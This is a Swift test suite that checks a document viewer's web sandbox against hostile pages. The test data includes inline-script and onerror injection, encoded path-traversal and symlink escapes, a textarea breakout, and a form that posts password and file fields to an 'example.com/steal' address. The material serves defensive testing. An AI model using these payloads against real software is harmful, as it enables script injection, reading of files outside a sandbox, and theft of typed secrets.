import Foundation
import Testing
import WebKit

@testable import Gloss

/// Loads a hostile page through the real scheme handler and a real web page,
/// then asks the page what actually happened.
@MainActor
@Suite struct PageTrustTests {
    private static let pixel = Data(
        base64Encoded:
            "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="
    )!

    private struct Report: Decodable {
        let inlineScript: Bool
        let inlineHandler: Bool
        let local: Int
        let nested: Int
        let remoteBlocked: String
        let symlinkEscape: Int
        let background: String
        let bundleEscape: String
    }

    private func makeTree() throws -> URL {
        let base = FileManager.default.temporaryDirectory
            .appendingPathComponent("gloss-trust-\(UUID().uuidString)").resolvingSymlinksInPath()
        let root = base.appendingPathComponent("root")
        try FileManager.default.createDirectory(
            at: root.appendingPathComponent("img"), withIntermediateDirectories: true)
        try Self.pixel.write(to: root.appendingPathComponent("pixel.png"))
        try Self.pixel.write(to: root.appendingPathComponent("img/nested.png"))
        try Self.pixel.write(to: base.appendingPathComponent("outside.png"))
        try FileManager.default.createSymbolicLink(
            at: root.appendingPathComponent("escape.png"),
            withDestinationURL: base.appendingPathComponent("outside.png"))
        try Data("# doc".utf8).write(to: root.appendingPathComponent("doc.md"))
        let bundle = base.appendingPathComponent("theme.glossbundle")
        try FileManager.default.createDirectory(at: bundle, withIntermediateDirectories: true)
        try Data("body { background: rgb(1, 2, 3) }".utf8).write(to: bundle.appendingPathComponent("theme.css"))
        try Data("body { color: rgb(9, 9, 9) }".utf8).write(to: base.appendingPathComponent("outside.css"))
        return base
    }

    @Test func hostilePageRunsNothingAndReadsNothingOutsideItsRoot() async throws {
        let base = try makeTree()
        defer { try? FileManager.default.removeItem(at: base) }

        let hostile = """
            <!doctype html><html><head>
            <link rel="stylesheet" href="gloss://bundle/t/theme.css">
            <link rel="stylesheet" href="gloss://bundle/t/%2e%2e/outside.css">
            <link rel="stylesheet" href="gloss://bundle/other/theme.css">
            <link rel="stylesheet" href="gloss://app/Info.plist">
            </head><body>
            <script>window.inlineScript = true</script>
            <img id="handler" src="missing.png" onerror="window.inlineHandler = true">
            <img id="local" src="pixel.png">
            <img id="nested" src="img/nested.png">
            <img id="escape" src="escape.png">
            </body></html>
            """

        let model = PageModel()
        await model.load(
            html: hostile, fileURL: base.appendingPathComponent("root/doc.md"),
            bundles: ["t": base.appendingPathComponent("theme.glossbundle")])

        let raw = try await model.page.callJavaScript(
            """
            const images = [...document.images];
            await Promise.all(images.map(image => image.complete ? null : new Promise(done => {
              image.addEventListener('load', done);
              image.addEventListener('error', done);
            })));
            const width = id => document.getElementById(id).naturalWidth;
            // A failed remote load proves nothing (the host may be down), so ask
            // the policy itself: it reports the URL it refused.
            const remoteBlocked = await new Promise(resolve => {
              document.addEventListener('securitypolicyviolation', event => resolve(event.blockedURI), { once: true });
              const image = new Image();
              image.src = 'https://example.com/pixel.png';
              document.body.append(image);
              setTimeout(() => resolve(''), 2000);
            });
            return JSON.stringify({
              inlineScript: window.inlineScript === true,
              inlineHandler: window.inlineHandler === true,
              local: width('local'),
              nested: width('nested'),
              remoteBlocked,
              symlinkEscape: width('escape'),
              background: getComputedStyle(document.body).backgroundColor,
              bundleEscape: getComputedStyle(document.body).color,
            });
            """)
        let report = try JSONDecoder().decode(Report.self, from: Data(try #require(raw as? String).utf8))

        #expect(!report.inlineScript, "an inline script ran")
        #expect(!report.inlineHandler, "an inline event handler ran")
        #expect(report.local == 1, "a file beside the document did not load")
        #expect(report.nested == 1, "a file in a subdirectory did not load")
        #expect(report.remoteBlocked.hasPrefix("https://example.com"), "the policy did not refuse a remote image")
        #expect(report.symlinkEscape == 0, "a symlink out of the root was followed")
        #expect(report.background == "rgb(1, 2, 3)", "the bundle's stylesheet did not apply")
        #expect(report.bundleEscape != "rgb(9, 9, 9)", "a path out of the bundle was followed")
    }

    /// A document may ask its reader to fill in fields, but never for a
    /// secret or a file, and nothing typed can be submitted anywhere.
    @Test func formControlsCannotAskForSecretsOrSubmit() async throws {
        let base = try makeTree()
        defer { try? FileManager.default.removeItem(at: base) }
        let hostile = """
            <form action="https://example.com/steal" method="post">
            <input type="password" name="pw">
            <input type="file" name="f">
            <input type="hidden" name="h" value="x">
            <input type="text" name="t" formaction="https://example.com/x" autofocus onfocus="window.focusHandler = true">
            <input type="submit" value="Go"><button>Go</button>
            </form>

            <textarea name="n"></textarea><script>window.breakout = true</script></textarea>

            <textarea name="m"><img src=x onerror="window.inner = true"></textarea>
            """
        let model = PageModel()
        await model.show(text: hostile, fileURL: base.appendingPathComponent("root/doc.md"), appearance: "dark")

        let raw = try await model.page.callJavaScript(
            """
            const text = document.querySelector('input[name="user-content-t"]');
            text.focus();
            text.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }));
            await new Promise(done => setTimeout(done, 300));
            return JSON.stringify({
              forms: document.forms.length,
              types: [...document.querySelectorAll('input')].map(i => i.type),
              buttons: document.querySelectorAll('button').length,
              script: window.breakout === true || window.inner === true || window.focusHandler === true,
              stillHere: location.protocol === 'gloss:',
              inner: document.querySelector('textarea[name="user-content-m"]').value,
            });
            """)
        let report = try #require(raw as? String)
        #expect(report.contains("\"forms\":0"), "a form reached the page: \(report)")
        #expect(report.contains("\"types\":[\"text\"]"), "an input other than the text box reached the page: \(report)")
        #expect(report.contains("\"buttons\":0"), "\(report)")
        #expect(report.contains("\"script\":false"), "a script ran: \(report)")
        #expect(report.contains("\"stillHere\":true"), "\(report)")
        #expect(report.contains("<img src=x onerror="), "a text box's content was not kept as text: \(report)")
    }

    @Test func servesOnlyNamedAppFilesAndKnownBundles() throws {
        let base = try makeTree()
        defer { try? FileManager.default.removeItem(at: base) }
        let store = PageStore()
        store.show(
            html: "<p>x</p>", document: base.appendingPathComponent("root/doc.md"),
            bundles: ["t": base.appendingPathComponent("theme.glossbundle")])

        func status(_ url: String) -> Int {
            (store.respond(to: URLRequest(url: URL(string: url)!)).0 as? HTTPURLResponse)?.statusCode ?? 0
        }
        #expect(status("gloss://app/gloss.js") == 200)
        #expect(status("gloss://app/Info.plist") == 403)
        #expect(status("gloss://app/../Info.plist") == 403)
        #expect(status("gloss://bundle/t/theme.css") == 200)
        #expect(status("gloss://bundle/other/theme.css") == 403)
        #expect(status("gloss://bundle/t/%2e%2e/outside.css") == 403)
        #expect(status("gloss://bundle/t") == 403)
        #expect(status("gloss://doc/pixel.png") == 200)
        #expect(status("gloss://doc/%2e%2e/outside.png") == 403)
        #expect(status("gloss://doc/escape.png") == 403)
        #expect(status("gloss://elsewhere/x") == 404)
    }
}
